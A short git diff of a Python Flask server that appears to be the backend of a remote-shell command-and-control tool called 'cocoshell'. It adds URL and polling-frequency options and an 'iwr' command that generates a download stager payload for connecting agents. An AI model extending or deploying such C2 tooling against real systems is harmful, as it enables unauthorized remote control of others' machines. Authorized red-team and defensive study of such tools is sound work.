@@ -3,12 +3,16 @@ from os.path import exists
 from multiprocessing import Process
 from flask import Flask, session, request
 from werkzeug.exceptions import BadRequest
+from payload import *
 
 parser = argparse.ArgumentParser()
 parser.add_argument("-r", "--route", help="the api endpoint the agent will connect to")
+parser.add_argument("-u", "--url", help="the url the agent will connect to")
+parser.add_argument("-f", "--frequency", help="the amount of seconds the agent waits for the next command (default: 1)")
 args, leftovers = parser.parse_known_args()
 
 route = args.route
+frequency = args.frequency if args.frequency is not None else 1
 
 db_exists = exists("cocoshell.db")
 con = sqlite3.connect("cocoshell.db", check_same_thread=False)
@@ -95,6 +99,8 @@ def command_handling(cmd):
             return ''
     if cmd == "pulse":
         return heartbeat()
+    if cmd == "iwr":
+        return generate_payload(args.url, frequency)
         
         
 if __name__ == '__main__':
